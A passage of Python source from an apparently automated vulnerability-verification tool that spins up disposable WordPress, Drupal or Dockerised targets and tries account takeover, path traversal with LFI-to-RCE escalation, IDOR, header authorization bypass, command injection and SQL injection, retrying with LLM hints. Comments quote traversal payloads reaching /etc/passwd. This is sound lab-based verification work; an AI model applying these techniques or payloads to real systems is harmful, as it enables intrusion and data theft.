                        fr.local_path, plugin_dir, notes.get("endpoint"),
                        notes.get("http_method") or "POST", params,
                        id_param_hint=id_p or "", email_param_hint=email_p or "",
                        pass_param_hint=pass_p or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure)
                    # mismo bucle de aprendizaje-y-reintento que el resto de tecnicas WordPress --
                    # no existia antes para account-takeover/login-as (pedido explicitamente:
                    # extenderlo "a todos"), asi que esta es la PRIMERA vez que estas dos tecnicas
                    # pueden reintentar con una pista del LLM, no solo resolver nonce/setup de
                    # forma determinista en el unico intento que hacian antes.
                    ato_extra_nonce_pages: List[str] = []
                    ato_extra_setup_trigger_paths: List[str] = []
                    def _on_ato_suggestion(sug):
                        _apply_generic_wp_suggestion(sug, ato_extra_nonce_pages,
                                                     ato_extra_setup_trigger_paths, params)
                    def _attempt_ato(ep, pr):
                        return verify_wordpress_account_takeover(
                            fr.local_path, plugin_dir, ep, notes.get("http_method") or "POST",
                            params, id_param_hint=pr or "", email_param_hint=email_p or "",
                            pass_param_hint=pass_p or "", on_step=step, budget_s=budget_s,
                            companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                            keep_lab_on_failure=keep_lab_on_failure,
                            extra_nonce_pages=list(ato_extra_nonce_pages),
                            extra_setup_trigger_paths=list(ato_extra_setup_trigger_paths))
                    wr = _retry_or_keep_lab_alive(
                        keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                            llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                            _attempt_ato, wr, notes.get("endpoint"), id_p,
                            technique_label="account-takeover WordPress",
                            on_suggestion=_on_ato_suggestion))
                elif id_p:
                    step(("intentando verificacion DINAMICA -- patron de login-as directo "
                         "(WordPress+MySQL efimero en Docker)..." if es else
                         "attempting DYNAMIC verification -- direct login-as pattern "
                         "(ephemeral WordPress+MySQL in Docker)..."))
                    wr = verify_wordpress_direct_login_as(
                        fr.local_path, plugin_dir, notes.get("endpoint"),
                        notes.get("http_method") or "GET", params,
                        id_param_hint=id_p or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure)
                    lia_extra_nonce_pages: List[str] = []
                    lia_extra_setup_trigger_paths: List[str] = []
                    def _on_lia_suggestion(sug):
                        _apply_generic_wp_suggestion(sug, lia_extra_nonce_pages,
                                                     lia_extra_setup_trigger_paths, params)
                    def _attempt_lia(ep, pr):
                        return verify_wordpress_direct_login_as(
                            fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET",
                            params, id_param_hint=pr or "", on_step=step, budget_s=budget_s,
                            companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                            keep_lab_on_failure=keep_lab_on_failure,
                            extra_nonce_pages=list(lia_extra_nonce_pages),
                            extra_setup_trigger_paths=list(lia_extra_setup_trigger_paths))
                    wr = _retry_or_keep_lab_alive(
                        keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                            llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                            _attempt_lia, wr, notes.get("endpoint"), id_p,
                            technique_label="direct login-as WordPress",
                            on_suggestion=_on_lia_suggestion))
                if wr is None:
                    inv.blockers.append(("verificacion dinamica no intentada: la hipotesis no trae "
                                         "ni un parametro de email/password ni uno de ID "
                                         "reconocible; afina 'parameters' en la hipotesis del LLM "
                                         "o pasalos a mano" if es else
                                         "dynamic verification not attempted: the hypothesis has "
                                         "neither a recognizable email/password parameter nor an "
                                         "ID one; refine 'parameters' in the LLM hypothesis or "
                                         "pass them by hand"))
                else:
                    inv.dynamic_verify = {"attempted": True, "available": wr.available,
                                          "ok": wr.ok, "verified": wr.verified, "detail": wr.detail,
                                          "logs": wr.logs}
                    inv.attempt_evidence = wr.evidence
                    if wr.verified:
                        inv.verified = True
                        inv.verified_detail = wr.detail
                        inv.verified_evidence = wr.evidence
                    elif not wr.available:
                        inv.blockers.append(("verificacion dinamica no intentada: " + wr.limitations[0]
                                             if wr.limitations else
                                             "verificacion dinamica no disponible (sin Docker)"))
                    else:
                        inv.blockers.append((f"verificacion dinamica intentada pero no confirmada: "
                                             f"{wr.detail}" if es else
                                             f"dynamic verification attempted but not confirmed: "
                                             f"{wr.detail}"))
                        # si wpverify.py capturo logs del contenedor que no arranco a tiempo (p.ej.
                        # MySQL/Apache bajo emulacion lenta), se adjuntan recortados: evita tener
                        # que reproducir el fallo a ciegas para diagnosticarlo.
                        for entry in wr.logs:
                            if entry.startswith("docker logs"):
                                head, _, body = entry.partition("\n")
                                trimmed = "\n".join(body.splitlines()[-15:])
                                inv.blockers.append(f"{head}:\n```\n{trimmed}\n```")
            elif (fr.kind in ("local-zip", "zip-url") and not plugin_dir
                  and inv.vuln_class in ("missing-authorization", "idor")):
                inv.blockers.append(("verificacion dinamica no intentada: no se pudo determinar "
                                     "automaticamente la carpeta del plugin dentro del .zip "
                                     "(varias carpetas de primer nivel, ninguna con una cabecera "
                                     "'Plugin Name:' reconocible)" if es else
                                     "dynamic verification not attempted: could not auto-detect "
                                     "the plugin folder inside the .zip (multiple top-level "
                                     "folders, none with a recognizable 'Plugin Name:' header)"))
            # mismo mecanismo de laboratorio efimero, para path-traversal/LFI en Drupal (segunda
            # clase de Drupal, "poco a poco" -- ver drupalverify.py).
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "path-traversal" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_path_traversal, _pick_param
                from .wpverify import _PATH_HINTS
                params = notes.get("parameters") or []
                path_p = notes.get("path_param") or _pick_param(params, _PATH_HINTS)
                step(("intentando verificacion DINAMICA -- fichero canario con secreto aleatorio "
                     "(Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- random-secret canary file "
                     "(ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_path_traversal(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "GET", params,
                    path_param_hint=path_p or "", on_step=step, budget_s=budget_s)
                def _attempt_pt_drupal(ep, pr):
                    return verify_drupal_path_traversal(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        path_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_PATH_TRAVERSAL_RETRY_SYS,
                    _GENERIC_PATH_TRAVERSAL_RETRY_EVIDENCE_KEYS, _attempt_pt_drupal, wr,
                    notes.get("endpoint"), path_p, technique_label="path-traversal Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo mecanismo de laboratorio efimero, para path-traversal/LFI: en vez de deducir el
            # account-takeover por un segundo login, se planta un fichero canario con un secreto
            # aleatorio FUERA del volumen web y se confirma que el endpoint lo filtra literal.
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "path-traversal" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_path_traversal, _pick_param, _PATH_HINTS
                params = notes.get("parameters") or []
                path_p = notes.get("path_param") or _pick_param(params, _PATH_HINTS)
                step(("intentando verificacion DINAMICA -- fichero canario con secreto aleatorio "
                     "(WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- random-secret canary file "
                     "(ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_path_traversal(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "GET", params,
                    path_param_hint=path_p or "", on_step=step, budget_s=budget_s,
                    companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                    keep_lab_on_failure=keep_lab_on_failure)
                # aprendizaje y reintento: mismo bucle acotado que el SQLi -- el LLM lee el
                # cuerpo real del primer intento y solo sugiere un reintento con una pista
                # concreta en ESA evidencia, nunca a ciegas. Tambien puede señalar una pagina
                # extra para el nonce o una URL de setup de administrador (ver
                # _WP_NONCE_SETUP_RETRY_HINT) -- mismo mecanismo que SQLi, no exclusivo de esa
                # tecnica: path-traversal contra un endpoint AJAX puede tropezar con el mismo
                # nonce/plugin-sin-configurar.
                pt_extra_nonce_pages: List[str] = []
                pt_extra_setup_trigger_paths: List[str] = []
                def _on_wppt_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, pt_extra_nonce_pages,
                                                 pt_extra_setup_trigger_paths, params)
                def _attempt_wppt(ep, pr):
                    return verify_wordpress_path_traversal(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        path_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(pt_extra_nonce_pages),
                        extra_setup_trigger_paths=list(pt_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _PATH_TRAVERSAL_RETRY_SYS,
                        _PATH_TRAVERSAL_RETRY_EVIDENCE_KEYS, _attempt_wppt, wr,
                        notes.get("endpoint"), path_p, technique_label="path-traversal WordPress",
                        on_suggestion=_on_wppt_suggestion))
                inv.dynamic_verify = {"attempted": True, "available": wr.available,
                                      "ok": wr.ok, "verified": wr.verified, "detail": wr.detail,
                                      "logs": wr.logs}
                inv.attempt_evidence = wr.evidence
                if wr.verified:
                    inv.verified = True
                    inv.verified_detail = wr.detail
                    inv.verified_evidence = wr.evidence
                elif not wr.available:
                    inv.blockers.append(("verificacion dinamica no intentada: " + wr.limitations[0]
                                         if wr.limitations else
                                         "verificacion dinamica no disponible (sin Docker)"))
                else:
                    inv.blockers.append((f"verificacion dinamica intentada pero no confirmada: "
                                         f"{wr.detail}" if es else
                                         f"dynamic verification attempted but not confirmed: "
                                         f"{wr.detail}"))
                    for entry in wr.logs:
                        if entry.startswith("docker logs"):
                            head, _, body = entry.partition("\n")
                            trimmed = "\n".join(body.splitlines()[-15:])
                            inv.blockers.append(f"{head}:\n```\n{trimmed}\n```")
            # "cualquier entorno": fallback generico de path-traversal (ver genericverify.py) para
            # cuando el codigo descargado no es un CMS reconocido pero trae su propio Dockerfile/
            # docker-compose.yml. Acepta source_dir aunque el LLM no haya dado endpoint: el
            # verificador escanea el codigo fuente para descubrir rutas (Rack::Static, Sinatra,
            # Flask) de forma autonoma (ver _scan_web_routes en genericverify.py).
            elif (not plugin_dir and fr.local_path and inv.vuln_class == "path-traversal" and
                  (notes.get("endpoint") or os.path.isdir(str(fr.local_path)))):
                from .genericverify import verify_generic_path_traversal, _pick_param
                from .wpverify import _PATH_HINTS
                import re as _re_pt
                # Normalizar endpoint: LLMs a veces generan notacion de ruta de framework
                # como '/static/<path:filename>' (Flask) o '/files/{name}' (FastAPI). Esos
                # patrones impiden que URL_PATH mode se active (el verificador lo activa cuando
                # el endpoint termina en '/'). Se eliminan los segmentos de parametro al final.
                _raw_pt_ep = notes.get("endpoint") or ""
                _pt_ep = _re_pt.sub(r'(?:/<[^>]+>|/\{[^}]+\}|/:[^/]+)+$', '/', _raw_pt_ep)
                if _pt_ep == _raw_pt_ep:
                    # patron sin '/' previo (ej. 'files/{id}' al final)
                    _pt_ep = _re_pt.sub(r'(?:<[^>]+>|\{[^}]+\})$', '', _raw_pt_ep)
                # Si el endpoint viene de un PoC y ya lleva el payload de traversal incrustado
                # (ej. '/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd' o
                # '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'), extraer solo la base path.
                # El verificador construye sus propios payloads -- el endpoint base (terminado
                # en '/') es lo que necesita para activar URL_PATH mode.
                if not _pt_ep.endswith('/'):
                    _trav_m = _re_pt.search(r'(?i)(?:/\.%2e|/%2e%2e|/\.\./)', _pt_ep)
                    if _trav_m:
                        _pt_ep = _pt_ep[:_trav_m.start() + 1]
                # Endpoints adicionales a probar cuando el LLM saco el endpoint de un PoC con
                # traversal incrustado (cgi-bin es el path tipico de CVE-2021-41773 y similares;
                # el PoC puede usar /icons/ o /static/ pero /cgi-bin/ es el que funciona en
                # configuraciones Apache por defecto que habiliten mod_cgi).
                _extra_pt_eps = []
                if _pt_ep.endswith('/') and _pt_ep != '/cgi-bin/' and _raw_pt_ep != _pt_ep:
                    _extra_pt_eps = ['/cgi-bin/']
                params = notes.get("parameters") or []
                path_p = notes.get("path_param") or _pick_param(params, _PATH_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- fichero canario, el objetivo "
                     "se construye desde su propio Dockerfile/compose..." if es else
                     "attempting GENERIC DYNAMIC verification -- canary file, the target is "
                     "built from its own Dockerfile/compose..."))
                wr = verify_generic_path_traversal(
                    fr.local_path, _pt_ep, notes.get("http_method") or "GET",
                    params, path_param_hint=path_p or "", on_step=step, budget_s=budget_s)
                # aprendizaje y reintento, version GENERICA (cualquier tecnologia, no solo
                # WordPress) -- mismo bucle acotado que el SQLi de WordPress: el LLM lee el
                # cuerpo real del primer intento y solo sugiere un reintento con una pista
                # concreta en ESA evidencia, nunca a ciegas.
                def _attempt_pt(ep, pr):
                    return verify_generic_path_traversal(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        path_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_PATH_TRAVERSAL_RETRY_SYS,
                    _GENERIC_PATH_TRAVERSAL_RETRY_EVIDENCE_KEYS, _attempt_pt, wr,
                    _pt_ep, path_p, technique_label="path-traversal generico")
                # Si no se verifico todavia, probar los endpoints adicionales (p.ej. /cgi-bin/
                # cuando el endpoint del PoC era /icons/ -- CVE-2021-41773 / Apache httpd).
                for _ep_extra in _extra_pt_eps:
                    if wr.verified:
                        break
                    step((f"probando endpoint alternativo {_ep_extra!r} (el PoC usaba "
                         f"{_pt_ep!r})..." if es else
                         f"trying alternative endpoint {_ep_extra!r} (PoC used "
                         f"{_pt_ep!r})..."))
                    _wr_extra = verify_generic_path_traversal(
                        fr.local_path, _ep_extra, notes.get("http_method") or "GET",
                        params, path_param_hint=path_p or "", on_step=step, budget_s=budget_s)
                    if _wr_extra.verified or (not wr.verified and _wr_extra.ok):
                        wr = _wr_extra
                _apply_wpverify_result(inv, wr, es, llm)
                # escalada: path-traversal (clase de la hipotesis) puede en realidad ser LFI-a-
                # RCE si el parametro INCLUYE el fichero como codigo en vez de solo servirlo --
                # envenenamiento del log de acceso propio, prueba independiente y mas fuerte (ver
                # verify_generic_lfi_rce). Se intenta SIEMPRE que haya Docker, confirmado o no el
                # traversal de solo-lectura -- si confirma, pisa el resultado con el hallazgo mas
                # fuerte (RCE, no solo lectura); si no, anade el intento como blocker extra.
                if wr.available:
                    from .genericverify import verify_generic_lfi_rce
                    step(("probando escalada LFI-a-RCE -- envenenamiento del log de acceso "
                         "propio..." if es else
                         "attempting LFI-to-RCE escalation -- own access-log poisoning..."))
                    wr_rce = verify_generic_lfi_rce(
                        fr.local_path, _pt_ep, notes.get("http_method") or "GET",
                        params, path_param_hint=path_p or "", on_step=step, budget_s=budget_s)
                    _apply_wpverify_result(inv, wr_rce, es, llm)
            # "cualquier entorno": fallback generico de IDOR (ver genericverify.py) para cuando
            # el codigo descargado no es un CMS reconocido pero trae su propio Dockerfile/
            # docker-compose.yml -- DELIBERADAMENTE mas debil que el IDOR de WordPress/Drupal/
            # Joomla (no hay sesion autenticada generica posible sin conocer el stack): nunca
            # marca `verified`, solo deja constancia de una diferencia real observada sin login.
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class == "idor" and notes.get("endpoint")):
                from .genericverify import verify_generic_idor, _pick_param
                from .wpverify import _ID_HINTS
                params = notes.get("parameters") or []
                id_p = notes.get("id_param") or _pick_param(params, _ID_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- diferencia SIN sesion "
                     "(mas debil que con cuentas reales), el objetivo se construye desde su "
                     "propio Dockerfile/compose..." if es else
                     "attempting GENERIC DYNAMIC verification -- no-session difference "
                     "(weaker than with real accounts), the target is built from its own "
                     "Dockerfile/compose..."))
                wr = verify_generic_idor(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, id_param_hint=id_p or "", on_step=step, budget_s=budget_s)
                _apply_wpverify_result(inv, wr, es, llm)
            # "cualquier entorno": bypass de autorizacion via CABECERA HTTP (p.ej.
            # CVE-2025-29927, Next.js x-middleware-subrequest). El analista pasa la cabecera
            # y el valor exacto via --bypass-header y --bypass-value (o el LLM los propone
            # en bypass_header/bypass_value de la hipotesis). La prueba es simple: sin la
            # cabecera el servidor responde 3xx/401/403; con ella, 2xx.
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class in ("missing-authorization", "auth-bypass", "idor") and
                  notes.get("endpoint") and notes.get("bypass_header")):
                from .genericverify import verify_generic_header_bypass
                step(("intentando verificacion DINAMICA GENERICA -- bypass de autorizacion "
                     "via cabecera HTTP, el objetivo se construye desde su propio "
                     "Dockerfile/compose..." if es else
                     "attempting GENERIC DYNAMIC verification -- authorization bypass via "
                     "HTTP header, the target is built from its own Dockerfile/compose..."))
                wr = verify_generic_header_bypass(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    bypass_header=notes["bypass_header"],
                    bypass_value=notes.get("bypass_value", ""),
                    confirm_string=notes.get("confirm_string", ""),
                    on_step=step, budget_s=budget_s)
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo laboratorio efimero, para command injection en Drupal (cuarta clase de
            # Drupal, "poco a poco" -- ver drupalverify.py).
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class in ("command-injection", "os-command-injection")
                  and notes.get("endpoint")):
                from .drupalverify import verify_drupal_command_injection, _pick_param
                from .wpverify import _CMD_HINTS
                params = notes.get("parameters") or []
                cmd_p = notes.get("cmd_param") or _pick_param(params, _CMD_HINTS)
                step(("intentando verificacion DINAMICA -- aritmetica calculada por el shell "
                     "remoto (Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- arithmetic computed by the remote shell "
                     "(ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_command_injection(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "GET", params,
                    cmd_param_hint=cmd_p or "", on_step=step, budget_s=budget_s)
                def _attempt_cmdi_drupal(ep, pr):
                    return verify_drupal_command_injection(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        cmd_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_MUESTRA_EVIDENCE_KEYS,
                    _attempt_cmdi_drupal, wr, notes.get("endpoint"), cmd_p,
                    technique_label="command injection Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo laboratorio efimero, para command injection: en vez de leer un fichero, el
            # payload hace que el shell remoto CALCULE una suma (ver verify_wordpress_command_injection)
            # y confirma que ese numero -- que no esta en el payload -- aparece en la respuesta.
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class in ("command-injection", "os-command-injection")
                  and notes.get("endpoint")):
                from .wpverify import verify_wordpress_command_injection, _pick_param, _CMD_HINTS
                params = notes.get("parameters") or []
                cmd_p = notes.get("cmd_param") or _pick_param(params, _CMD_HINTS)
                step(("intentando verificacion DINAMICA -- aritmetica calculada por el shell "
                     "remoto (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- arithmetic computed by the remote shell "
                     "(ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_command_injection(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "GET", params,
                    cmd_param_hint=cmd_p or "", on_step=step, budget_s=budget_s,
                    companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                    keep_lab_on_failure=keep_lab_on_failure)
                cmdi_extra_nonce_pages: List[str] = []
                cmdi_extra_setup_trigger_paths: List[str] = []
                def _on_cmdi_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, cmdi_extra_nonce_pages,
                                                 cmdi_extra_setup_trigger_paths, params)
                def _attempt_cmdi(ep, pr):
                    return verify_wordpress_command_injection(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        cmd_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(cmdi_extra_nonce_pages),
                        extra_setup_trigger_paths=list(cmdi_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_cmdi, wr, notes.get("endpoint"), cmd_p,
                        technique_label="command injection WordPress",
                        on_suggestion=_on_cmdi_suggestion))
                inv.dynamic_verify = {"attempted": True, "available": wr.available,
                                      "ok": wr.ok, "verified": wr.verified, "detail": wr.detail,
                                      "logs": wr.logs}
                inv.attempt_evidence = wr.evidence
                if wr.verified:
                    inv.verified = True
                    inv.verified_detail = wr.detail
                    inv.verified_evidence = wr.evidence
                elif not wr.available:
                    inv.blockers.append(("verificacion dinamica no intentada: " + wr.limitations[0]
                                         if wr.limitations else
                                         "verificacion dinamica no disponible (sin Docker)"))
                else:
                    inv.blockers.append((f"verificacion dinamica intentada pero no confirmada: "
                                         f"{wr.detail}" if es else
                                         f"dynamic verification attempted but not confirmed: "
                                         f"{wr.detail}"))
                    for entry in wr.logs:
                        if entry.startswith("docker logs"):
                            head, _, body = entry.partition("\n")
                            trimmed = "\n".join(body.splitlines()[-15:])
                            inv.blockers.append(f"{head}:\n```\n{trimmed}\n```")
            # "cualquier entorno", no solo CMS conocidos: si el codigo descargado no es un
            # plugin/modulo/extension reconocido (no hay plugin_dir), pero trae su PROPIO
            # Dockerfile/docker-compose.yml, binoracle lo construye y lo arranca TAL CUAL y
            # verifica contra ese contenedor real -- ver genericverify.py. Mas limitado que los
            # verificadores CMS-especificos (sin login generico), asi que de momento solo cubre
            # las clases que no lo necesitan.
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class in ("command-injection", "os-command-injection")
                  and notes.get("endpoint")):
                from .genericverify import verify_generic_command_injection, _pick_param
                from .wpverify import _CMD_HINTS
                params = notes.get("parameters") or []
                cmd_p = notes.get("cmd_param") or _pick_param(params, _CMD_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- fichero canario via docker "
                     "exec, el objetivo se construye desde su propio Dockerfile/compose..." if es
                     else "attempting GENERIC DYNAMIC verification -- canary file via docker "
                     "exec, the target is built from its own Dockerfile/compose..."))
                wr = verify_generic_command_injection(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, cmd_param_hint=cmd_p or "", on_step=step, budget_s=budget_s)
                def _attempt_cmdi_generic(ep, pr):
                    return verify_generic_command_injection(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        cmd_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_cmdi_generic, wr, notes.get("endpoint"), cmd_p,
                    technique_label="command injection generico")
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo laboratorio efimero, para SQLi en Drupal (quinta clase de Drupal, "poco a
            # poco" -- ver drupalverify.py).
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class in ("sqli", "sql-injection") and notes.get("endpoint")):
                from .drupalverify import verify_drupal_sqli, _pick_param
                from .wpverify import _SQLI_HINTS
                params = notes.get("parameters") or []
                sqli_p = notes.get("sqli_param") or _pick_param(params, _SQLI_HINTS)
                step(("intentando verificacion DINAMICA -- UNION-based/boolean-blind "
                     "(Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- UNION-based/boolean-blind "
                     "(ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_sqli(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "GET", params,
                    sqli_param_hint=sqli_p or "", on_step=step, budget_s=budget_s)
                def _attempt_sqli_drupal(ep, pr):
                    return verify_drupal_sqli(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        sqli_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _SQLI_RETRY_SYS, _SQLI_RETRY_EVIDENCE_KEYS,
                    _attempt_sqli_drupal, wr, notes.get("endpoint"), sqli_p,
                    technique_label="SQLi Drupal", max_attempts=_SQLI_RETRY_MAX_ATTEMPTS)
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo laboratorio efimero, para SQLi: UNION-based (extrae version() real de la
            # base de datos) con fallback a boolean-blind diferencial -- ver verify_wordpress_sqli.
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class in ("sqli", "sql-injection") and notes.get("endpoint")):
                from .wpverify import verify_wordpress_sqli, _pick_param, _SQLI_HINTS
                from .websource import find_shortcode_name, find_join_relationship_table
                params = notes.get("parameters") or []
                _raw_sqli = notes.get("sqli_param") or ""
                # Si sqli_param es una clave simple ("order") pero los parametros refinados
                # contienen un path de array mas especifico ("order[0][dir]"), usarlo -- esto
                # ocurre cuando find_ajax_action_for_param encontro la accion via la clave
                # exterior y luego _deterministic_web_hints_from_source extrae el path completo.
                if _raw_sqli:
                    for _pp in (params or []):
                        if str(_pp).startswith(_raw_sqli + "["):
                            _raw_sqli = str(_pp)
                            break
                sqli_p = _raw_sqli or _pick_param(params, _SQLI_HINTS)
                # si el endpoint es la raiz ('/'), atacarla directamente no puede reflejar
                # ninguna diferencia (es la portada vacia por defecto, sin contenido del plugin)
                # -- confirmado en vivo, CVE-2024-3552: con el shortcode real del plugin,
                # verify_wordpress_sqli crea una pagina de verdad y ataca ESA en su lugar.
                endpoint_is_bare_root = (notes.get("endpoint") or "/").strip() in ("", "/")
                # si ya se tiene el fichero GROUNDED de la funcion vulnerable (ver
                # inv.source_grounding mas arriba), se usa para desambiguar CUAL shortcode es el
                # relevante cuando el plugin registra varios -- informacion real de este CVE en
                # concreto, no una suposicion generica (ver find_shortcode_name).
                vuln_file_hint = ""
                _found = (inv.source_grounding or {}).get("found") or {}
                _first_locs = next(iter(_found.values()), []) if _found else []
                if _first_locs:
                    vuln_file_hint = _first_locs[0].rsplit(":", 1)[0]
                # se busca el shortcode SIEMPRE, no solo cuando se ataca la raiz: incluso contra
                # un endpoint AJAX propio, verify_wordpress_sqli crea la pagina del shortcode
                # (sin redirigir el ataque ahi -- ver attack_endpoint_is_bare_root en wpverify.py)
                # solo para que el nonce real de esa accion se pueda rascar de una pagina que de
                # verdad invoca el plugin -- confirmado en vivo, CVE-2024-1071 (Ultimate Member):
                # sin esto, el nonce rascado de paginas genericas (login/portada) nunca es el de
                # la accion AJAX real, y el ataque falla siempre con "Wrong Nonce".
                shortcode_name = find_shortcode_name(fr.local_path, plugin_dir,
                                                     vulnerable_file=vuln_file_hint)
                # si el sumidero real esta detras de un LEFT JOIN propio del plugin enlazado por
                # post ID (patron comun en plugins de listados/directorios), una pagina SIN fila
                # ahi sale siempre NULL en esa columna -- el WHERE nunca es verdadero, inyeccion
                # real o no -- confirmado en vivo, CVE-2024-3552 (tabla w2dc_levels_relationships).
                relationship_table = (find_join_relationship_table(fr.local_path, plugin_dir)
                                      if endpoint_is_bare_root else None)
                step(("intentando verificacion DINAMICA -- UNION-based/boolean-blind "
                     "(WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- UNION-based/boolean-blind "
                     "(ephemeral WordPress+MySQL in Docker)..."))
                # keep_lab_on_failure (calculado una vez arriba, para todas las tecnicas): el
                # analista pide depuracion manual (--keep-lab-on-failure) -- las 5 tecnicas
                # automaticas no pueden ver el error real de MySQL cuando el propio plugin lo
                # captura y responde con JSON limpio en vez de dejarlo salir en el cuerpo HTTP
                # (confirmado en vivo, CVE-2024-1071), asi que seguir reintentando a ciegas (que
                # ademas DESTRUIRIA este mismo laboratorio para levantar uno nuevo en cada
                # vuelta) no ayuda -- un unico intento, con el laboratorio vivo al final para
                # que el analista mire wp-content/debug.log el mismo, vale mas que tres
                # intentos ciegos que nunca dejan nada en pie que inspeccionar.
                # Si el endpoint es admin-ajax.php, el metodo debe ser POST: $_POST no se
                # popula con GET y la inyeccion nunca llega al codigo vulnerable.
                _sqli_ep = notes.get("endpoint") or ""
                _sqli_http_method = ("POST" if "admin-ajax" in _sqli_ep
                                     else notes.get("http_method") or "GET")
                wr = verify_wordpress_sqli(
                    fr.local_path, plugin_dir, _sqli_ep,
                    _sqli_http_method, params,
                    sqli_param_hint=sqli_p or "", on_step=step, budget_s=budget_s,
                    setup_wp_options=notes.get("setup_options") or [],
                    companion_plugins=companion_plugins, shortcode_name=shortcode_name,
                    relationship_table=relationship_table,
                    keep_lab_on_failure=keep_lab_on_failure)
                # aprendizaje y reintento: si no se confirmo pero SI hubo laboratorio real (no es
                # un problema de infraestructura), se le pide al LLM que lea la MISMA evidencia
